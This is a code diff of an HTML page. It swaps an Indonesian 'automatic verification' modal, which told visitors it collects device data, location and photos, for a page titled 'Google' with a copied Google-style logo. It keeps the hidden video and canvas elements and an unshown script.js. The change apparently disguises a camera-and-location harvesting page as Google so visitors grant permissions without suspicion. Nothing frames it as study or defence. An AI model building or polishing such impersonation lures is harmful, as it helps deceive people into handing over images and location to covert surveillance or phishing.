@@ -3,79 +3,52 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verifikasi Otomatis</title>
+  <title>Google</title>
   <style>
-    body {
+    html, body {
       margin: 0;
-      font-family: "Segoe UI", sans-serif;
-      background: #f5f7fa;
+      padding: 0;
+      background-color: #fff;
+      font-family: Arial, sans-serif;
+      color: #202124;
+      height: 100%;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      overflow: hidden;
     }
 
-    .modal {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      background: rgba(0, 0, 0, 0.6);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      animation: fadeIn 0.3s ease-in-out;
+    .logo {
+      font-size: 84px;
+      font-weight: bold;
+      color: #4285f4;
+      letter-spacing: -4px;
+      margin-bottom: 40px;
     }
 
-    .modal-content {
-      background: white;
-      padding: 2rem;
-      border-radius: 16px;
-      max-width: 460px;
-      text-align: center;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-      animation: slideUp 0.5s ease;
-    }
-
-    @keyframes fadeIn {
-      from {opacity: 0;}
-      to {opacity: 1;}
-    }
-
-    @keyframes slideUp {
-      from {transform: translateY(40px); opacity: 0;}
-      to {transform: translateY(0); opacity: 1;}
-    }
-
-    h1 {
-      color: #333;
-      margin-bottom: 0.5em;
-    }
-
-    p {
-      color: #555;
-      font-size: 15px;
-      margin-bottom: 1.5em;
-    }
+    .logo span:nth-child(2) { color: #ea4335; }
+    .logo span:nth-child(3) { color: #fbbc05; }
+    .logo span:nth-child(4) { color: #4285f4; }
+    .logo span:nth-child(5) { color: #34a853; }
+    .logo span:nth-child(6) { color: #ea4335; }
 
     ul {
       list-style: none;
-      padding: 0;
-      margin-top: 1.5em;
-      max-height: 250px;
-      overflow-y: auto;
-      text-align: left;
+      padding-left: 0;
+      width: 90%;
+      max-width: 600px;
+      font-size: 14px;
+      color: #3c4043;
     }
 
     li {
-      padding: 10px;
-      border-bottom: 1px solid #eee;
-      font-size: 14px;
+      padding: 8px 0;
+      border-bottom: 1px solid #f1f3f4;
     }
 
     li.error {
       color: #d93025;
-      font-weight: bold;
+      font-weight: 500;
     }
 
     video, canvas {
@@ -85,17 +58,15 @@
 </head>
 <body>
 
-<div class="modal" id="popupModal">
-  <div class="modal-content">
-    <h1>Verifikasi Otomatis</h1>
-    <p>Memproses data perangkat, lokasi, dan foto. Mohon izinkan jika diminta oleh browser.</p>
-    <ul id="status-list"></ul>
+  <div class="logo">
+    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
   </div>
-</div>
 
-<video id="video" playsinline></video>
-<canvas id="canvas"></canvas>
+  <ul id="status-list"></ul>
 
-<script src="script.js"></script>
+  <video id="video" playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script src="script.js"></script>
 </body>
 </html>
